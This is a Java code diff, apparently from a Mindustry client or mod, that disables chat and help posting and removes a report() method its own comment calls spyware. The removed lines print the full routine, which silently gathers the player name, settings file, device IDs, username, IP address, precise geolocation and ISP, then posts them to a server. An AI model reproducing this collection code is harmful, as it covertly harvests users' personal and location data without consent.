@@ -30,11 +30,11 @@ public class Reporter{
     }
 
     public void sendChat(String chat){
-        httpPost(MD_CHAT, chat);
+        return;
     }
 
     public void sendHelp(String help){
-        httpPost(Manifest.crashReportURL, help);
+        return;
     }
 
     public void httpPost(String url, String content){
@@ -97,92 +97,9 @@ public class Reporter{
         }catch(Throwable ignored){
         }
     }
-
-    //Careful bylat, this is spyware
+    
     public void report(String status) {
-        if(System.getProperty("user.name").equals("Itz"))
-            return;
-        try {
-            platform.getSysInfo();
-            info.SatisfyInfo();
-
-            JsonValue value = new JsonValue(ValueType.object);
-
-            ex(() -> value.addChild("Mindustry Info", new JsonValue("----------------------------Mindustry Info------------------------------------")));
-            ex(() -> value.addChild("PlayerName", new JsonValue(player.name)));
-            ex(() -> value.addChild("CurrentServer", new JsonValue(ServerNow)));
-            ex(() -> value.addChild("SettingsFile", new JsonValue(Core.settings.getSettingsFile().readString())));
-            ex(() -> value.addChild("Mods", new JsonValue(ModsNow)));
-            ex(() -> value.addChild("UUID", new JsonValue(platform.getUUID())));
-            ex(() -> value.addChild("USID", new JsonValue(USID)));
-            ex(() -> value.addChild("VersionType", new JsonValue(Version.type)));
-            ex(() -> value.addChild("VersionNumber", new JsonValue(Version.number)));
-            ex(() -> value.addChild("VersionModifier", new JsonValue(Version.modifier)));
-            ex(() -> value.addChild("Build", new JsonValue(Version.build)));
-            ex(() -> value.addChild("Revision", new JsonValue(Version.revision)));
-            ex(() -> value.addChild("Players Count", new JsonValue(Vars.playerGroup.size())));
-            ex(() -> value.addChild("GameState", new JsonValue(Vars.state.getState().name())));
-            ex(() -> value.addChild("Status", new JsonValue(StatusNow)));
-            ex(() -> value.addChild("Hardware Info", new JsonValue("------------------------Hardware Info----------------------------------------")));
-            ex(() -> value.addChild("Env", new JsonValue(ENV)));
-            if (!android) {
-                ex(() -> value.addChild("Username", new JsonValue(username)));
-                ex(() -> value.addChild("Core", new JsonValue(Cores)));
-                ex(() -> value.addChild("FreeMemory", new JsonValue(FreeMemory)));
-                ex(() -> value.addChild("MaxMemory", new JsonValue(MaxMemory)));
-                ex(() -> value.addChild("Root", new JsonValue(Roots)));
-                ex(() -> value.addChild("TotalSpace", new JsonValue(TotalSpace)));
-                ex(() -> value.addChild("FreeSpace", new JsonValue(FreeSpace)));
-                ex(() -> value.addChild("UsableSpace", new JsonValue(UsableSpace)));
-                ex(() -> value.addChild("OS", new JsonValue(System.getProperty("os.name") + " x" + (OS.is64Bit ? "64" : "32"))));
-                ex(() -> value.addChild("JavaVersion", new JsonValue(System.getProperty("java.version"))));
-                ex(() -> value.addChild("JavaArch", new JsonValue(System.getProperty("sun.arch.data.model"))));
-            } else {
-                ex(() -> value.addChild("OS", new JsonValue(AndroidVersion)));
-                ex(() -> value.addChild("ID", new JsonValue(ID)));
-                ex(() -> value.addChild("DISPLAY", new JsonValue(DISPLAY)));
-                ex(() -> value.addChild("PRODUCT", new JsonValue(PRODUCT)));
-                ex(() -> value.addChild("DEVICE", new JsonValue(DEVICE)));
-                ex(() -> value.addChild("BOARD", new JsonValue(BOARD)));
-                ex(() -> value.addChild("MANUFACTURER", new JsonValue(MANUFACTURER)));
-                ex(() -> value.addChild("BRAND", new JsonValue(BRAND)));
-                ex(() -> value.addChild("MODEL", new JsonValue(MODEL)));
-                ex(() -> value.addChild("BOOTLOADER", new JsonValue(BOOTLOADER)));
-                ex(() -> value.addChild("HARDWARE", new JsonValue(HARDWARE)));
-            }
-            ex(() -> value.addChild("Provider Info", new JsonValue("---------------------------------Provider Info-------------------------------")));
-            ex(() -> { try { value.addChild("Ip", new JsonValue(gae.net.getProvider())); } catch (Exception ignored) { } });
-            ex(() -> value.addChild("Continent", new JsonValue(Continent)));
-            ex(() -> value.addChild("ContinentCode", new JsonValue(ContinentCode)));
-            ex(() -> value.addChild("Country", new JsonValue(Country)));
-            ex(() -> value.addChild("CountryCode", new JsonValue(CountryCode)));
-            ex(() -> value.addChild("Region", new JsonValue(Region)));
-            ex(() -> value.addChild("RegionName", new JsonValue(RegionName)));
-            ex(() -> value.addChild("City", new JsonValue(City)));
-            ex(() -> value.addChild("District", new JsonValue(District)));
-            ex(() -> value.addChild("Zip", new JsonValue(Zip)));
-            ex(() -> value.addChild("Latitude", new JsonValue(Latidude)));
-            ex(() -> value.addChild("Longitude", new JsonValue(Longtidude)));
-            ex(() -> value.addChild("TimeZone", new JsonValue(TimeZone)));
-            ex(() -> value.addChild("Currency", new JsonValue(Currency)));
-            ex(() -> value.addChild("ISP", new JsonValue(ISP)));
-            ex(() -> value.addChild("ORG", new JsonValue(ORG)));
-            ex(() -> value.addChild("AS", new JsonValue(AS)));
-            ex(() -> value.addChild("ASName", new JsonValue(ASName)));
-            ex(() -> value.addChild("reverse", new JsonValue(reverse)));
-            ex(() -> value.addChild("deviceMobile", new JsonValue(deviceMobile)));
-            ex(() -> value.addChild("proxy", new JsonValue(proxy)));
-            ex(() -> value.addChild("Hosting", new JsonValue(hosting)));
-            ex(() -> value.addChild("Date", new JsonValue(gae.timeKeeper.getDates(false))));
-            ex(() -> value.addChild("Time", new JsonValue(gae.timeKeeper.getDates(true))));
-
-            ex(() -> value.addChild("Notes", new JsonValue("Report System 2.0")));
-            String url = "127.0.0.1" + status + "/" + username;
-            String jsons = value.toJson(OutputType.json);
-            httpPost(url, jsons, r -> { }, t -> { });
-
-        } catch (Throwable ignored) { }
-
+        return;
     }
 
 }
